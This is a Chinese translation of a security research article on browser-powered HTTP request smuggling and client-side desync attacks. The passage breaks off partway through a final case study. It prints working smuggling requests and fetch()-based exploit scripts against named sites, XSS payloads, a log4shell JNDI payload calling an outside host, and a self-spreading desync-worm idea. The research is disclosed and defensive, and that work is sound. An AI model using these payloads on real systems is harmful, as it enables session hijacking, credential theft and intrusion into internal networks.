https://portswigger.net/research/browser-powered-desync-attacks

# Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling

> 作者：**James Kettle**（研究总监）  
> Twitter：[@albinowax](https://twitter.com/albinowax)

![James Kettle 头像](/content/images/profiles/callout_james_kettle_112px.png)

- **发布时间：** 2022 年 8 月 10 日（星期三）18:00 UTC
- **更新日期：** 2025 年 9 月 3 日（星期三）07:36 UTC

![文章配图](/cms/images/52/c5/60a7-article-browser-powered_desync_attacks_article.jpg)

最近 [HTTP 请求走私](/web-security/request-smuggling) 的兴起引发了大量关键发现，使众多主要网站几乎完全沦陷。然而，这一威胁此前仅限于攻击者可访问的具有反向代理前端的系统……直到现在。

在本文中，我将向您展示如何将受害者的 Web 浏览器变成一个反同步攻击投放平台，通过暴露单服务器网站和内部网络来拓展请求走私的边界。您将学习如何将跨域请求与服务器缺陷相结合，投毒浏览器连接池、安装后门并释放反同步蠕虫。利用这些技术，我将入侵包括 Apache、Akamai、Varnish、Amazon 以及多个 Web VPN 在内的目标。

这个新领域既带来了新的机遇，也带来了新的挑战。虽然一些经典的反同步小工具可以改造使用，但其他场景则需要极端的创新。为此，我将分享一套经过实战检验的方法论，结合浏览器功能和自定义开源工具。我们还将发布免费的在线实验，帮助您磨练新技能。

我还将分享研究历程，揭示一种黑盒分析策略，该策略解决了一个长期存在的反同步障碍，并发现了一种极其有效的新型反同步触发器。由此产生的影响将涵盖客户端、服务器端乃至中间人攻击。最后，我将演示如何操纵 HTTPS 以在 Apache 上触发基于 MITM 的反同步攻击。

这项研究已在 [Black Hat USA 2022](https://www.blackhat.com/us-22/briefings/schedule/index.html#browser-powered-desync-attacks-a-new-frontier-in-http-request-smuggling-26414) 和 [DEF CON 30](https://defcon.org/html/defcon-30/dc-30-schedule.html#:~:text=Browser%2DPowered%20Desync%20Attacks%3A%20A%20New%20Frontier%20in%20HTTP%20Request%20Smuggling) 上现场展示：

<iframe src="https://www.youtube.com/embed/B8KW8KPVcUo?origin=https://portswigger.net&rel=0"></iframe>

您也可以阅读本文的[可打印白皮书版本](https://portswigger.net/kb/papers/firuaml/browser-powered-desync-attacks.pdf)，适合离线阅读，[幻灯片](https://portswigger.net/kb/papers/firuaml/browser-powered-desync-attacks-slides.pdf)也可获取。

## 大纲

本文涵盖四个关键主题。

**[HTTP 处理异常](#anomalies)** 涵盖了一系列新颖的漏洞和攻击技术，这些技术导致了浏览器驱动的反同步攻击的核心发现，以及 amazon.com 和 AWS Application Load Balancer 中的严重缺陷。

**[客户端反同步](#csd)** 介绍了一类新的反同步攻击，它能够投毒浏览器连接池，受影响系统涵盖大型 CDN 到 Web VPN。

**[基于暂停的反同步](#pause)** 介绍了一种影响 Apache 和 Varnish 的新型反同步技术，可用于触发服务器端和客户端的反同步攻击。

**[结论](#conclusion)** 提供了缓解这些威胁的实用建议，以及尚未被发现的潜在变种。

在本文中，我将使用“浏览器驱动的反同步攻击”作为总称，指代所有可以通过 Web 浏览器触发的反同步攻击。这涵盖了所有客户端反同步攻击，以及部分服务器端反同步攻击。

在案例研究中，我将针对相当多的真实网站。本文中引用的所有漏洞均已报告给相关供应商，并且除非另有说明，均已被修补。我们研究期间获得的所有漏洞赏金均[捐赠给慈善机构](https://twitter.com/PortSwigger/status/1499776690746241030)。

本研究建立在 [HTTP Desync Attacks](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) 和 [HTTP/2: The Sequel is Always Worse](https://portswigger.net/research/http2) 中引入的概念之上——如果有什么不明白的地方，回头参考这些白皮书可能会有所帮助。我们还在 Web Security Academy 中涵盖了本主题的核心必读内容。

### 实践应用

本文介绍了许多技术，我非常希望确保它们对您有效。为此：

- 我的团队建立了一个 Academy 主题，包含[关键漏洞的实时复现](https://portswigger.net/web-security/request-smuggling/browser)，供您免费在线练习。
- 我发布了每个案例研究背后的完整源代码，作为 [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler) 和 [Turbo Intruder](https://github.com/PortSwigger/turbo-intruder) 的更新。

祝您好运！

## HTTP 处理异常

研究发现往往看似凭空出现。在本节中，我将描述导致浏览器驱动的反同步攻击发现的四个独立漏洞。这将提供有用的背景信息，并且这些技术本身也相当强大。

### 连接状态攻击

抽象是使现代系统可理解的重要工具，但它们也可能掩盖关键细节。

如果您不尝试请求走私攻击，很容易忘记 HTTP 连接复用，并将 HTTP 请求视为独立实体。毕竟，HTTP 应该是无状态的。然而，底层的字节流（通常是 TLS）只是一串字节，很容易找到实现不佳的 HTTP 服务器，它们假设通过单个连接发送的多个请求必须共享某些属性。

我在实际中看到的主要错误是，服务器假设通过给定 TLS 连接发送的每个 HTTP/1.1 请求必须具有相同的预期目标和 HTTP Host 头。由于 Web 浏览器遵守这一假设，一切都会正常工作，直到有人带着 Burp Suite 出现。

我遇到过两种不同的场景，其中这种错误具有重大的安全后果。

#### 首次请求验证

反向代理通常使用 Host 头来标识将每个请求路由到哪个后端服务器，并有一个允许访问的主机白名单：

```
GET / HTTP/1.1
Host: redacted
```

```
HTTP/1.1 200 OK
```

```
GET / HTTP/1.1
Host: intranet.redacted
```

```
-connection reset-
```

然而，我发现某些代理只对给定连接上的第一个请求应用此白名单。这意味着攻击者可以通过向允许的目标发出请求，然后通过同一连接向内部网站发出请求，从而获得对内部网站的访问权限：

```
GET / HTTP/1.1
Host: redacted

GET / HTTP/1.1
Host: intranet.redacted

```

```
HTTP/1.1 200 OK
...

HTTP/1.1 200 OK

Internal website
```

幸运的是，这种错误相当罕见。

#### 首次请求路由

首次请求路由是一个密切相关的缺陷，当前端使用第一个请求的 Host 头来决定将请求路由到哪个后端，然后将来自同一客户端连接的所有后续请求路由到同一后端连接时发生。

这本身不是漏洞，但它使攻击者能够使用任意 Host 头访问任何后端，因此可以与 [Host 头攻击](https://portswigger.net/web-security/host-header)（如密码重置投毒、[Web 缓存投毒](/web-security/web-cache-poisoning)和访问其他虚拟主机）链式利用。

在此示例中，我们希望使用投毒的 Host 头“psres.net”对 example.com 的后端进行密码重置投毒攻击，但前端不会路由我们的请求：

```
POST /pwreset HTTP/1.1
Host: psres.net
```

```
HTTP/1.1 421 Misdirected Request
...
```

然而，通过以对目标站点的有效请求开始我们的请求序列，我们可以成功到达后端：

```
GET / HTTP/1.1
Host: example.com

POST /pwreset HTTP/1.1
Host: psres.net
```

```
HTTP/1.1 200 OK
...

HTTP/1.1 302 Found
Location: /login
```

希望触发一封发送给受害者的电子邮件，其中包含投毒的密码重置链接：

```
Click here to reset your password: https://psres.net/reset?k=secret
```

您可以使用 HTTP Request Smuggler 中的“connection-state probe”选项来扫描这两个缺陷。

### 意外因素

大多数 HTTP 请求走私攻击可以描述如下：

发送一个长度不明确的 HTTP 请求，使前端服务器和后端服务器在消息结束位置产生分歧，以便对下一个请求应用恶意前缀。这种歧义通常通过混淆的 Transfer-Encoding 头实现。

去年年底，我偶然发现了一个挑战这一定义和许多底层假设的漏洞。

该漏洞由以下 HTTP/2 请求触发，它不使用任何混淆也不违反任何 RFC。甚至长度也没有任何歧义，因为 HTTP/2 在帧层有内置的长度字段：

**请求头：**

- `:method`: `POST`
- `:path`: `/`
- `:authority`: `redacted`

**消息体：**

```
X
```

这个请求触发了运行 AWS Application Load Balancer（ALB）作为前端的各种网站出现极其可疑的间歇性 400 Bad Request 响应。调查揭示，ALB 在将请求降级为 HTTP/1.1 转发到后端时神秘地添加了一个“Transfer-Encoding: chunked”头，而没有对消息体进行任何修改：

```
POST / HTTP/1.1
Host: redacted
Transfer-Encoding: chunked

X
```

利用非常简单——我只需要提供一个有效的分块体：

**请求头：**

- `:method`: `POST`
- `:path`: `/`
- `:authority`: `redacted`

**消息体：**

```
0

malicious-prefix
```

```
POST / HTTP/1.1
Host: redacted
Transfer-Encoding: chunked

0

malicious-prefix
```

这是一个完美的漏洞示例，让您在事后试图理解实际发生了什么以及为什么。这个请求只有一个不寻常之处——它没有 Content-Length（CL）头。由于前面提到的内置长度字段，在 HTTP/2 中省略 CL 是明确允许的。然而，浏览器总是发送 CL，所以服务器显然没有预料到没有 CL 的请求。

我向 AWS 报告了此问题，他们在五天内修复了。这暴露了许多使用 ALB 的网站容易受到请求走私攻击，但真正的价值在于它教会我们的教训。你不需要头部混淆或歧义来进行请求走私；你所需要的只是一个被服务器感到意外的情况。

### 检测连接锁定的 CL.TE

带着这两个教训，我决定解决去年 HTTP/2 研究强调的一个开放问题——[连接锁定](https://youtube.com/watch?v=gAnDUoq1NzQ?t=1327) HTTP/1.1 请求走私漏洞的通用检测。连接锁定指的是一种常见行为，即前端为每个与客户端建立的连接创建一个到后端的新连接。这使得直接的跨用户攻击大多不可能，但仍留下了其他攻击途径。

要识别此漏洞，您需要通过单个连接发送“攻击者”和“受害者”请求，但这会产生大量误报，因为服务器行为无法与一种常见的无害功能——[HTTP 流水线](https://www.youtube.com/watch?t=249&v=vCpIAsxESFY)区分开。例如，给定以下 CL.TE 攻击的请求/响应序列，您无法判断目标是否易受攻击：

```
POST / HTTP/1.1
Host: example.com
Content-Length: 41
Transfer-Encoding: chunked

0

GET /hopefully404 HTTP/1.1
Foo: bar
GET / HTTP/1.1
Host: example.com

```

```
HTTP/1.1 301 Moved Permanently
Location: /en

HTTP/1.1 404 Not Found
Content-Length: 162...
```

HTTP 流水线在 Burp Repeater 中也可见，经常被误认为是真正的请求走私：

![Burp Repeater 中的 HTTP 流水线](/cms/images/58/3f/3976-article-screenshot_2022-08-16_at_15.29.56.png)

您可以通过增加 Turbo Intruder 中的 requestsPerConnection 设置来亲自测试——只需准备好面对误报。

我浪费了很多时间试图调整请求来解决这个问题。最终我决定精确阐述为什么上述响应不能证明存在漏洞，解决方案立刻变得清晰：

从上面的响应序列中，您可以判断后端正在使用 Transfer-Encoding 头解析请求，因为随后的 404 响应。然而，您无法判断前端是使用请求的 Content-Length 因此易受攻击，还是安全地将其视为分块并假设橙色数据已被流水线处理。

为了排除流水线的可能性并证明目标确实易受攻击，您只需在完成分块请求（`0\r\n\r\n`）后暂停并尝试提前读取。如果服务器在您的读取尝试期间响应，这表明前端认为消息已完成，因此肯定安全地将其解释为分块：

```
POST / HTTP/1.1
Host: example.com
Content-Length: 41
Transfer-Encoding: chunked

0

```

```
HTTP/1.1 301 Moved Permanently
Location: /en
```

如果您的读取尝试挂起，这表明前端正在等待消息完成，因此肯定在使用 Content-Length，使其易受攻击：

```
POST / HTTP/1.1
Host: example.com
Content-Length: 41
Transfer-Encoding: chunked

0
```

```
-connection timeout-
```

这种技术也可以很容易地适应 TE.CL 漏洞。将其集成到 HTTP Request Smuggler 中后，很快发现了一个运行在 Barracuda WAF 后面的 IIS 网站，容易受到 `Transfer-Encoding : chunked` 的攻击。有趣的是，修复此漏洞的更新已经可用，但它是作为[推测性加固措施](https://campus.barracuda.com/product/loadbalanceradc/doc/95257522/release-notes-version-6-5/)实现的，因此未被标记为安全版本，目标没有安装它。

### CL.0 浏览器兼容的反同步

早期读取技术标记了另一个网站，最初看起来像是连接锁定的 TE.CL 漏洞。然而，服务器对我的手动探测和读取没有按预期响应。当我尝试简化请求时，我发现 Transfer-Encoding 头实际上被前端和后端完全忽略了。这意味着我可以完全剥离它，留下一个简单得令人困惑的攻击：

```
POST / HTTP/1.1
Host: redacted
Content-Length: 3

xyz
GET / HTTP/1.1
Host: redacted

```

```
HTTP/1.1 200 OK
Location: /en

HTTP/1.1 405 Method Not Allowed
```

前端使用了 Content-Length，但后端显然完全忽略了它。结果，后端将消息体视为第二个请求方法的开始。忽略 CL 等同于将其视为 0，所以这是一个 CL.0 反同步——一种[已知](https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf)但较少被探索的攻击类别。

```
TE.CL and CL.TE // 经典请求走私
H2.CL and H2.TE // HTTP/2 降级走私
CL.0            // 此
H2.0            // 由 CL.0 隐含
0.CL and 0.TE   // 没有流水线则无法利用
```

关于此漏洞的第二个甚至更重要的注意事项是，它是由一个完全有效、符合规范的 HTTP 请求触发的。这意味着前端完全没有机会防御它，甚至浏览器也可以触发它。

此攻击之所以可能，是因为后端服务器根本没有预料到 POST 请求。这让我思考，既然我是偶然发现的，如果我特意去寻找，会有多少网站出现？

### amazon.com 上的 H2.0

实施对 CL.0/H2.0 反同步漏洞的粗略扫描检查表明，它们影响了包括 amazon.com 在内的许多网站，该网站在发送到 `/b/` 的请求上忽略了 CL：

```
POST /b/ HTTP/2
Host: www.amazon.com
Content-Length: 23

GET /404 HTTP/1.1
X: X
GET / HTTP/1.1
Host: www.amazon.com

```

```
HTTP/2 200 OK
Content-Type: text/html

HTTP/2 200 OK
Content-Type: image/x-icon
```

我通过创建一个简单的概念验证（PoC）确认了此漏洞，该 PoC 将随机在线用户的完整请求（包括身份验证令牌）[存储](https://portswigger.net/web-security/request-smuggling/exploiting#capturing-other-users-requests)到我的购物清单中：

![Amazon 漏洞利用](/cms/images/9b/8b/ed86-article-amazon.png)

在我向 Amazon 报告后，我意识到我犯了一个可怕的错误，错过了一个更酷的潜在利用。攻击请求如此普通，我本可以让任何人的 Web 浏览器使用 `fetch()` 发出它。通过在 Amazon 上使用 HEAD 技术创建一个 XSS 小工具并在受害者浏览器中执行 JavaScript，我本可以让每个被感染的受害者自己重新发起攻击，从而传播给许多其他人。这将释放一个反同步蠕虫——一种自我复制的攻击，利用受害者感染其他受害者，无需用户交互，迅速利用 Amazon 上的每个活跃用户。

我不建议在生产系统上尝试这个，但在测试环境上尝试可能会很有趣。最终，这个浏览器驱动的反同步是一个很酷的发现，一个错失的机会，也是新攻击类别的提示。

## 客户端反同步

传统的反同步攻击投毒前端和后端服务器之间的连接，因此在不使用前端/后端架构的网站上是不可能的。从现在开始，我将其称为服务器端反同步。大多数服务器端反同步只能由发出格式错误请求的自定义 HTTP 客户端触发，但正如我们在 amazon.com 上看到的，有时可以创建浏览器驱动的服务器端反同步。

浏览器能够引起反同步，这开启了一类全新的威胁，我称之为客户端反同步（CSD），其中反同步发生在浏览器和前端服务器之间。这使得攻击单服务器网站成为可能，这很有价值，因为它们通常在 HTTP 解析方面非常糟糕。

CSD 攻击始于受害者访问攻击者的网站，然后使他们的浏览器向易受攻击的网站发送两个跨域请求。第一个请求被设计为使浏览器的连接反同步，并使第二个请求触发有害响应，通常使攻击者能够控制受害者的账户：

![CSD 攻击流程](/cms/images/b8/a5/459d-article-csd-fixed.png)

### 方法论

在尝试检测和利用客户端反同步漏洞时，您可以重用服务器端反同步攻击中的许多概念。主要区别在于整个利用序列发生在受害者的 Web 浏览器中，这是一个比专用黑客工具复杂得多且不受控制的环境。这带来了一些新的挑战，在研究这项技术时给我带来了很多痛苦。为了不让您重蹈覆辙，我吸取了教训并制定了以下方法论。在高层面上，它可能看起来很熟悉：

![CSD 方法论](/cms/images/f5/f0/0ac4-article-csd-methodology.png)

#### 检测

第一步是识别您的 CSD 向量。这个基本原语是漏洞的核心，也是构建漏洞利用的平台。我们已在 HTTP Request Smuggler 和 [Burp Scanner](/burp/vulnerability-scanner) 中实现了对这些的自动检测，但了解如何手动进行仍然很有价值。

CSD 向量是一个具有两个关键属性的 HTTP 请求。

首先，服务器必须忽略请求的 Content-Length（CL）。这通常发生是因为请求要么触发了服务器错误，要么服务器根本没有预料到对所选端点的 POST 请求。尝试针对静态文件和服务器级重定向，并通过超长 URL 和半格式错误的 URL（如 `/%2e%2e`）触发错误。

其次，请求必须在 Web 浏览器中可跨域触发。浏览器严格限制对跨域请求的控制，因此您对头的控制有限，如果您的请求有消息体，您将需要使用 HTTP POST 方法。最终您只控制 URL，加上一些零碎的东西，如 Referer 头、消息体和 Content-Type 的后半部分：

```
POST /favicon.ico HTTP/1.1
Host: example.com
Referer: https://attacker.net/?%00
Content-Type: text/plain; charset=null, boundary=x
```

现在我们已构造好攻击请求，需要检查服务器是否忽略 CL。作为简单的第一步，使用过长的 CL 发出请求，看看服务器是否仍然响应：

```
POST /favicon.ico
Host: example.com
Content-Length: 5

X
```

```
HTTP/1.1 200 OK
```

这很有希望，但不幸的是，一些安全的服务器会在不等待消息体的情况下响应，因此您会遇到一些误报。其他服务器不能正确处理 CL，但在响应后立即关闭每个连接，使其无法利用。为了过滤掉这些，通过同一连接发送两个请求，并观察第一个请求的消息体是否影响第二个请求的响应：

```
POST /favicon.ico
Host: example.com
Content-Length: 23

GET /404 HTTP/1.1
X: Y
GET / HTTP/1.1
Host: example.com

```

```
HTTP/1.1 200 OK

HTTP/1.1 404 Not Found
```

要在 Burp Suite 中测试这一点，将两个请求放入 Repeater 的选项卡组中，然后使用“Send Sequence over Single Connection”。您也可以在 Turbo Intruder 中通过禁用流水线并将 `concurrentConnections` 和 `requestsPerConnection` 分别设置为 1 和 100 来实现。

如果这有效，尝试改变消息体并确认第二个响应按预期变化。这个简单的步骤旨在确认您对正在发生的事情的心理模型与现实相符。我个人在一个运行 Citrix Web VPN 的系统上浪费了大量时间，才意识到它只是为发送到某个端点的每个请求发出了两个 HTTP 响应。

最后，注意目标网站是否支持 HTTP/2。CSD 攻击通常利用 HTTP/1.1 连接复用，而 Web 浏览器尽可能使用 HTTP/2，因此如果目标网站支持 HTTP/2，您的攻击不太可能起作用。有一个例外：某些转发代理不支持 HTTP/2，因此您可以利用任何使用它们的人。这包括企业代理、某些侵入性 VPN，甚至一些安全工具。

#### 确认

现在我们找到了 CSD 向量，我们需要通过在真实浏览器中复现行为来排除任何潜在错误。我建议使用 Chrome，因为它具有用于制作 CSD 漏洞利用的最佳开发者工具。

首先，选择一个发起攻击的站点。此站点必须通过 HTTPS 访问，并且位于与目标不同的域上。

接下来，确保您没有配置代理，然后浏览到您的攻击站点。打开开发者工具并切换到 Network 选项卡。为了帮助调试后续可能出现的问题，我建议进行以下调整：

- 选中“Preserve log”复选框。
- 右键单击列标题并启用“Connection ID”列。

切换到开发者控制台并执行 JavaScript 以使用 `fetch()` 复现您的攻击序列。这可能类似于：

```javascript
fetch('https://example.com/', {
    method: 'POST',
    body: "GET /hopefully404 HTTP/1.1\r\nX: Y", // 恶意前缀
    mode: 'no-cors', // 确保连接 ID 可见
    credentials: 'include' // 投毒 'with-cookies' 池
}).then(() => {
    location = 'https://example.com/' // 使用被投毒的连接
})
```

我设置了 `mode: 'no-cors'` 以确保 Chrome 在 Network 选项卡中显示连接 ID。我还设置了 `credentials: 'include'`，因为 Chrome 有两个[独立的连接池](https://www.chromium.org/developers/design-documents/network-stack/preconnect)——一个用于带 Cookie 的请求，一个用于不带 Cookie 的请求。您通常希望利用导航，而那些使用“带 Cookie”池，因此养成始终投毒该池的习惯是值得的。

当您执行此操作时，您应该在 Network 选项卡中看到两个具有相同连接 ID 的请求，第二个应该触发 404：

![Chrome 开发者工具](/cms/images/fe/7c/26c1-article-devtools.png)

如果这按预期工作，恭喜您——您找到了一个客户端反同步！

#### 探索

现在我们有了一个已确认的客户端反同步，下一步是找到我们可以用来利用它的小工具。在 Network 选项卡中触发意外的 404 可能会给某些人留下印象，但不太可能产生任何用户密码或赏金。

在这一点上，我们已经确定我们可以投毒受害者浏览器的连接池，并将任意前缀应用到一个我们选择的 HTTP 请求上。这是一个非常强大的原语，提供了三条广泛的攻击途径。

##### 存储

一种选择是识别目标网站上允许您存储文本数据的功能，并制作前缀，使受害者的 Cookie、身份验证头或密码最终存储在您可以检索的地方。这种攻击流程与[服务器端请求走私](https://portswigger.net/web-security/request-smuggling/exploiting#capturing-other-users-requests)几乎相同，因此我不再赘述。

##### 链式利用与横向移动

下一个选项是全新的，得益于我们在受害者浏览器中的新攻击平台。

在正常情况下，许多类别的服务器端攻击只能由直接访问目标网站的攻击者发起，因为它们依赖于浏览器拒绝发送的 HTTP 请求。这包括几乎所有涉及篡改 HTTP 头的攻击——Web 缓存投毒、大多数服务器端请求走私、Host 头攻击、基于 User-Agent 的 [SQL 注入](/web-security/sql-injection)等等。

例如，不可能让别人的浏览器发出以下带有 log4shell 载荷的 User-Agent 头的请求：

```
GET / HTTP/1.1
Host: intranet.example.com
User-Agent: ${jndi:ldap://x.oastify.com}
```

CSD 漏洞为这些攻击打开了一扇大门，这些攻击原本因为位于受信任的内部网络或隐藏在基于 IP 的限制后面而受到保护。例如，如果 intranet.example.com 容易受到 CSD 攻击，您可以使用以下请求达到相同的效果，该请求可以在浏览器中使用 `fetch()` 触发：

```
POST /robots.txt HTTP/1.1
Host: intranet.example.com
User-Agent: Mozilla/5.0 etc
Content-Length: 85

GET / HTTP/1.1
Host: intranet.example.com
User-Agent: ${jndi:ldap://x.oastify.com}
```

好在浏览器正在研究[针对内部网站攻击的缓解措施](https://wicg.github.io/private-network-access/)，我不敢想象有多少 IoT 设备容易受到 CSD 攻击。

您还可以利用环境权限（如会话 Cookie），以类似 CSRF 的方式攻击认证后的攻击面，而这通常由于不可伪造的头（如 JSON Content-Type）而无法实现。总体而言，CSD 漏洞非常适合与客户端和服务器端漏洞链式利用，在适当的情况下可能实现多步骤横向移动。

##### 攻击

最后一个选项是使用恶意前缀从服务器引发有害响应，通常目标是让易受攻击的网站执行任意 JavaScript，并劫持用户的会话或密码。

我发现通向成功攻击的最简单路径来自通常用于服务器端反同步攻击的两种关键技术：[通过 Host 头重定向进行 JavaScript 资源投毒](https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect)，以及使用 [HEAD 方法](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling#non-blind-request-tunnelling-using-head)拼接出带有有害 HTML 的响应。这两种技术都需要进行调整以克服与在受害者浏览器中操作相关的新挑战。在下一节中，我将使用一些案例研究来探讨这些障碍并展示如何处理它们。

### 案例研究

通过自动化检测 CSD 漏洞然后扫描我的漏洞赏金管道，我识别了一系列真实易受攻击的网站。在本节中，我将看看其中四个更有趣的，并看看方法论是如何发挥作用的。

#### Akamai——堆叠 HEAD

对于我们的第一个案例研究，我们将利用影响许多在 Akamai 上构建的网站的一个简单漏洞。作为示例目标，我将使用 www.capitalone.ca。

当 Akamai 发出重定向时，它会忽略请求的 Content-Length 头，并将任何消息体留在 TCP/TLS 套接字上。Capitalone.ca 使用 Akamai 将对 `/assets` 的请求重定向到 `/assets/`，因此我们可以通过向该端点发出 POST 请求来触发 CSD：

```javascript
fetch('https://www.capitalone.ca/assets', {method: 'POST', body: "GET /robots.txt HTTP/1.1\r\nX: Y", mode: 'no-cors', credentials: 'include'} )
```

```
POST /assets HTTP/1.1
Host: www.capitalone.ca
Content-Length: 30

GET /robots.txt HTTP/1.1
X: Y
GET /assets/ HTTP/1.1
Host: www.capitalone.ca

```

```
HTTP/1.1 301 Moved Permanently
Location: /assets/

HTTP/1.1 200 OK

Allow: /
```

为了构建漏洞利用，我们将使用 HEAD 方法将一组 HTTP 头与 Content-Type 为 text/html 和一个由在 Location 头中反射查询字符串的头组成的“消息体”相结合：

```
POST /assets HTTP/1.1
Host: www.capitalone.ca
Content-Length: 67

HEAD /404/?cb=123 HTTP/1.1

GET /x?<script>evil() HTTP/1.1
X: Y
GET / HTTP/1.1
Host: www.capitalone.ca

```

```
HTTP/1.1 301 Moved Permanently
Location: /assets/

HTTP/1.1 404 Not Found
Content-Type: text/html
Content-Length: 432837

HTTP/1.1 301 Moved Permanently
Location: /x/?<script>evil()
```

如果这是服务器端反同步攻击，我们可以在此停止。然而，要成功进行客户端反同步，我们需要解决两个复杂问题。

第一个问题是初始重定向响应。为了让注入的 JavaScript 执行，我们需要受害者的浏览器将响应渲染为 HTML，但 301 重定向会被浏览器自动跟随，从而破坏攻击。一个简单的解决方案是指定 `mode: 'cors'`，这会故意触发 CORS 错误。这可以防止浏览器跟随重定向，并使我们能够通过调用 `catch()` 而不是 `then()` 来恢复攻击序列。在 catch 块中，我们将使用 `location = 'https://www.capitalone.ca/'` 触发浏览器导航。使用 iframe 进行导航可能很诱人，但这会使我们暴露于同站 Cookie 等跨站攻击缓解措施。

第二个复杂问题叫做“堆叠响应问题”。浏览器有一种机制，如果它们收到的响应数据超过预期，就会丢弃连接。这极大地影响了您排队多个响应的技术的可靠性，例如我们在这里使用的 HEAD 方法。为了解决这个问题，我们需要延迟对 HEAD 请求的 404 响应。幸运的是，在这个目标上，我们可以通过添加一个具有随机值的参数作为缓存破坏器来轻松实现，触发缓存未命中并产生约 500 毫秒的延迟。以下是最终漏洞利用：

```javascript
fetch('https://www.capitalone.ca/assets', {
    method: 'POST',
    // 使用缓存破坏器延迟响应
    body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\nHost: www.capitalone.ca\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
    credentials: 'include',
    mode: 'cors' // 抛出错误而不是跟随重定向
}).catch(() => {
    location = 'https://www.capitalone.ca/'
})
```

我在 2021 年 11 月 3 日向 Akamai 报告了此问题，我不确定它何时被修复。

#### Cisco Web VPN——客户端缓存投毒

我们的下一个目标是 Cisco ASA WebVPN，它很贴心地几乎在所有端点上忽略了 Content-Length，因此我们只需向首页发出 POST 请求即可触发反同步。为了利用它，我们将使用 Host 头重定向小工具：

```
GET /+webvpn+/ HTTP/1.1
Host: psres.net

```

```
HTTP/1.1 301 Moved Permanently
Location: https://psres.net/+webvpn+/index.html
```

最简单的攻击是使用此重定向投毒套接字，将受害者导航到 `/+CSCOE+/logon.html`，并希望浏览器尝试使用被投毒的套接字导入 `/+CSCOE+/win.js`，被重定向，并最终从我们的站点导入恶意 JS。不幸的是，这非常不可靠，因为浏览器很可能会使用被投毒的套接字进行初始导航。为了避免这个问题，我们将执行客户端缓存投毒攻击。

首先，我们用重定向投毒套接字，然后将浏览器直接导航到 `/+CSCOE+/win.js`：

```javascript
fetch('https://redacted/', {method: 'POST', body: "GET /+webvpn+/ HTTP/1.1\r\nHost: x.psres.net\r\nX: Y", credentials: 'include'}).catch(() => { location='https://redacted/+CSCOE+/win.js' })
```

请注意，这种顶级导航对于绕过缓存分区至关重要——尝试使用 `fetch()` 会投毒错误的缓存。

浏览器将使用被投毒的套接字，收到恶意重定向，并将其保存在 `https://redacted/+CSCOE+/win.js` 的本地缓存中。然后，它将跟随重定向并返回到 `https://psres.net/+webvpn+/index.html` 的站点。我们将浏览器重定向到 `https://redacted/+CSCOE+/logon.html` 的登录页面。

当浏览器开始渲染登录页面时，它将尝试导入 `/+CSCOE+/win.js`，并发现它已经保存在缓存中。资源加载将跟随缓存的重定向，并向 `https://psres.net/+webvpn+/index.html` 发出第二个请求。此时，我们的服务器可以用一些恶意 JavaScript 响应，这些 JavaScript 将在目标站点的上下文中执行。

为了使此攻击成功，攻击者的网站需要在同一端点上提供重定向和恶意 JS。我采取了一种懒惰的方法，用 JS/HTML 多语言解决了这个问题——Chrome 似乎不介意错误的 Content-Type：

```
HTTP/1.1 200 OK
Content-Type: text/html

alert('oh dear')/*<script>location = 'https://redacted/+CSCOE+/logon.html'</script>*/
```

我在 2021 年 11 月 10 日向 Cisco 报告了此问题，最终在 2022 年 3 月 2 日，他们宣布由于产品已弃用而不会修复，但仍会为其注册 [CVE-2022-20713](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/csa-asa-webvpn-LOeKsNmO)。他们随后部署了内容安全策略，阻止了此 PoC，但进一步研究后可能可以绕过。

#### Verisign——分片分块

在寻找反同步向量时，有时最好超越探测有效端点，而是给服务器一些鼓励，让它进入不寻常的代码路径。在尝试半格式错误的 URL（如 `/%2f`）时，我发现只需向 `/..%2f` 发送 POST 请求即可在 verisign.com 上触发 CSD。

我最初尝试使用基于 HEAD 的方法，类似于之前在 Akamai 上使用的方法。不幸的是，这种方法依赖于基于 Content-Length 的响应，而服务器对所有没有消息体的请求都发送分块响应。此外，它拒绝包含 Content-Length 的 HEAD 请求。最终，经过广泛测试，我发现只要使用 `Transfer-Encoding: chunked`，服务器就会为 HEAD 请求发出基于 CL 的响应。

这在服务器端反同步中几乎无用，但由于受害者的浏览器在我的控制下，我可以准确预测下一个请求的大小，并在单个块中消耗它：

```
POST /%2f HTTP/1.1
Host: www.verisign.com
Content-Length: 81

HEAD / HTTP/1.1
Connection: keep-alive
Transfer-Encoding: chunked

34d
POST / HTTP/1.1
Host: www.verisign.com
Content-Length: 59

0

GET /<script>evil() HTTP/1.1
Host: www.verisign.com

```

```
HTTP/1.1 200 OK

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 54873

HTTP/1.1 301 Moved Permanently
Location: /en_US/?<script>evil()/index.xhtml
```

此攻击使用以下 JavaScript 触发：

```javascript
fetch('https://www.verisign.com/%2f', {
    method: 'POST',
    body: `HEAD /assets/languagefiles/AZE.html HTTP/1.1\r\nHost: www.verisign.com\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n34d\r\nx`,
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'}
}).catch(() => {
    let form = document.createElement('form')
    form.method = 'POST'
    form.action = 'https://www.verisign.com/robots.txt'
    form.enctype = 'text/plain'
    let input = document.createElement('input')
    input.name = '0\r\n\r\nGET /<svg/onload=alert(1)> HTTP/1.1\r\nHost: www.verisign.com\r\n\r\nGET /?aaaaaaaaaaaaaaa HTTP/1.1\r\nHost: www.verisign.com\r\n\r\n'
    input.value = ''
    form.appendChild(input)
    document.body.appendChild(form)
    form.submit()
})
```

这在 2021 年 12 月 22 日报告，经过一次失败后，于 2022 年 7 月 21 日成功修补。

#### Pulse Secure VPN

对于我们的最后一个研究案例，我们将针对 Pulse Secure VPN，它忽略了 POST 请求到静态文件（如 `/robots.txt`）的 Content-Length。就像 Cisco Web VPN 一样，这个目标有一个 Host 头重定向小工具，我将使用它来劫持 JavaScript 导入。然而，这次重定向不可缓存，因此客户端缓存投毒不是一个选项。

